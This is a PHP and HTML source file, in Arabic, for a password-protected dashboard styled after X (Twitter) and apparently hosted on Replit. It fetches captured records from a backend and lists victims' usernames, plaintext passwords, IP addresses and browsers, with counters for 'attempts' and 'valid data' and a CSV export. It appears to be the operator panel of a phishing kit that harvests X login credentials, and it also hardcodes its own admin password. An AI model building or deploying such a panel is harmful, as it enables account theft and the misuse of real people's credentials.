<?php
error_reporting(0);
ini_set('display_errors', 0);

// مصادقة بسيطة
$valid_username = 'admin';
$valid_password = 'Abujamal77'; // غيير هذا!

if (!isset($_SERVER['PHP_AUTH_USER']) || 
    !isset($_SERVER['PHP_AUTH_PW']) || 
    $_SERVER['PHP_AUTH_USER'] !== $valid_username || 
    $_SERVER['PHP_AUTH_PW'] !== $valid_password) {
    
    header('WWW-Authenticate: Basic realm="X Dashboard"');
    header('HTTP/1.0 401 Unauthorized');
    echo 'يجب تسجيل الدخول للوصول إلى لوحة التحكم';
    exit;
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة تحكم X - Replit</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }
        
        body {
            background: #000;
            color: #e7e9ea;
            direction: rtl;
            line-height: 1.6;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        header {
            text-align: center;
            margin-bottom: 30px;
            padding: 20px;
            border-bottom: 1px solid #2f3336;
        }
        
        h1 {
            color: #e7e9ea;
            margin-bottom: 10px;
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: #16181c;
            padding: 20px;
            border-radius: 12px;
            text-align: center;
            border: 1px solid #2f3336;
        }
        
        .stat-number {
            font-size: 2em;
            font-weight: bold;
            color: #1d9bf0;
        }
        
        .controls {
            margin-bottom: 20px;
            text-align: center;
        }
        
        .btn {
            background: #1d9bf0;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 25px;
            cursor: pointer;
            font-size: 16px;
            margin: 0 10px;
            text-decoration: none;
            display: inline-block;
            transition: background 0.2s ease;
        }
        
        .btn:hover {
            background: #1a8cd8;
        }
        
        .btn-danger {
            background: #f91880;
        }
        
        .btn-danger:hover {
            background: #e01775;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
            background: #16181c;
            border-radius: 12px;
            overflow: hidden;
        }
        
        th, td {
            padding: 12px 15px;
            text-align: right;
            border-bottom: 1px solid #2f3336;
        }
        
        th {
            background: #1d9bf0;
            color: white;
            font-weight: 600;
        }
        
        tr:hover {
            background: #1e2023;
        }
        
        @media (max-width: 768px) {
            .stats {
                grid-template-columns: 1fr;
            }
            
            table {
                font-size: 14px;
            }
            
            th, td {
                padding: 8px 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🧠 لوحة تحكم X - Replit</h1>
            <p>إحصاءات حية للبيانات المسجلة</p>
        </header>
        
        <div class="controls">
            <a href="process.php?action=export" class="btn">📥 تصدير CSV</a>
            <button onclick="location.reload()" class="btn">🔄 تحديث</button>
            <button onclick="clearData()" class="btn btn-danger">🗑️ مسح البيانات</button>
        </div>
        
        <div id="statsContainer" class="stats">
            <!-- سيتم تعبئتها بالجافاسكريبت -->
        </div>
        
        <div id="credentialsTable">
            <!-- سيتم تعبئتها بالجافاسكريبت -->
        </div>
    </div>

    <script>
        async function loadData() {
            try {
                const response = await fetch('process.php?action=view');
                const data = await response.json();
                
                updateStats(data);
                updateTable(data);
            } catch (error) {
                console.error('Error loading data:', error);
                document.getElementById('credentialsTable').innerHTML = 
                    '<p style="text-align: center; color: #f91880;">خطأ في تحميل البيانات</p>';
            }
        }
        
        function updateStats(data) {
            const statsContainer = document.getElementById('statsContainer');
            const total = data.length;
            const today = data.filter(item => {
                const itemDate = new Date(item.timestamp).toDateString();
                const todayDate = new Date().toDateString();
                return itemDate === todayDate;
            }).length;
            
            const withCredentials = data.filter(item => 
                item.username && item.username !== 'N/A' && item.password && item.password !== 'N/A'
            ).length;
            
            statsContainer.innerHTML = `
                <div class="stat-card">
                    <div class="stat-number">${total}</div>
                    <div>إجمالي المحاولات</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">${today}</div>
                    <div>محاولات اليوم</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">${withCredentials}</div>
                    <div>بيانات صالحة</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">${data.length > 0 ? new Date(data[0].timestamp).toLocaleDateString('ar-SA') : 'لا يوجد'}</div>
                    <div>آخر تحديث</div>
                </div>
            `;
        }
        
        function updateTable(data) {
            const tableContainer = document.getElementById('credentialsTable');
            
            if (data.length === 0) {
                tableContainer.innerHTML = '<p style="text-align: center;">لا توجد بيانات مسجلة بعد</p>';
                return;
            }
            
            let html = `
                <div style="overflow-x: auto;">
                    <table>
                        <thead>
                            <tr>
                                <th>الوقت</th>
                                <th>اسم المستخدم</th>
                                <th>كلمة المرور</th>
                                <th>عنوان IP</th>
                                <th>البلد</th>
                                <th>المتصفح</th>
                            </tr>
                        </thead>
                        <tbody>
            `;
            
            data.slice(0, 50).forEach(item => {
                html += `
                    <tr>
                        <td>${new Date(item.timestamp).toLocaleString('ar-SA')}</td>
                        <td style="color: ${item.username && item.username !== 'N/A' ? '#1d9bf0' : '#71767b'}">
                            ${item.username || 'N/A'}
                        </td>
                        <td style="color: ${item.password && item.password !== 'N/A' ? '#1d9bf0' : '#71767b'}">
                            ${item.password || 'N/A'}
                        </td>
                        <td>${item.ip_address || 'N/A'}</td>
                        <td>${item.language || 'N/A'}</td>
                        <td title="${item.user_agent || ''}">
                            ${(item.user_agent || 'N/A').substring(0, 30)}...
                        </td>
                    </tr>
                `;
            });
            
            html += `
                        </tbody>
                    </table>
                </div>
                ${data.length > 50 ? `<p style="text-align: center; margin-top: 15px; color: #71767b;">عرض ${50} من ${data.length} سجل</p>` : ''}
            `;
            
            tableContainer.innerHTML = html;
        }
        
        function clearData() {
            if (confirm('هل أنت متأكد من رغبتك في مسح جميع البيانات؟ لا يمكن التراجع عن هذا الإجراء.')) {
                // في Replit، يمكننا مسح الملفات أو تعطيلها
                alert('في بيئة Replit، يفضل تصدير البيانات أولاً ثم حذف الملفات يدوياً من قسم Files.');
            }
        }
        
        // تحميل البيانات عند البدء وتحديث كل 30 ثانية
        loadData();
        setInterval(loadData, 30000);
    </script>
</body>
</html>
